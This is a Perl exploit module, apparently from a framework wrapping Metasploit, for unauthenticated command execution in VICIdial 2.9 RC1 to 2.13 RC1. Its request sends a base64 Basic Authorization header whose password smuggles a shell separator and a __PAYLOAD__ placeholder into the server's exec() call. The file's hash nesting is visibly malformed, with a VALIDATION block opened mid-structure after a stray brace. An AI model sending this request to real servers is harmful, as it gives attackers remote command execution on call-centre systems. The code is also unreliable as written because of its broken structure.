package VICIDIAL::MSF::VicidialUserAuthorizationUnauthCmdExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "VicidialUserAuthorizationUnauthCmdExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

        This module exploits a vulnerability in VICIdial versions

        2.9 RC 1 to 2.13 RC1 which allows unauthenticated users

        to execute arbitrary operating system commands as the web

        server user if password encryption is enabled (disabled

        by default).



        When password encryption is enabled the user's password

        supplied using HTTP basic authentication is used in a call

        to exec().



        This module has been tested successfully on version 2.11 RC2

        and 2.13 RC1 on CentOS.

      ",
  MSF_MODULE  => "vicidial_user_authorization_unauth_cmd_exec",
  PATHS       => ["vicidial/"],
  REFERENCES  => ["http://www.vicidial.org/VICIDIALmantis/view.php?id=1016"],
  TITLE       => "VICIdial user_authorization Unauthenticated Command Execution",
  USERTITLE   => "PASSWORD",
  VARIABLES => {
    'PATH' =>       { DESCRIPTION => "The base path to VICIdial", VALUE => "/vicidial/" },
  },
      },  VALIDATION => {
    'TSTRING' =>       "Bcrypt password hashing script",

  TYPE => 'MSF',
  PLATFORM => 'UNIX',
  REQUESTS => {
    EXPLOIT100 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #100 Request : [GET] ',
      HEADERS      => {
        'Authorization' => 'Basic c3pvc2k6ZnpqV2FVbHN2byYgX19QQVlMT0FEX18gIw==',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
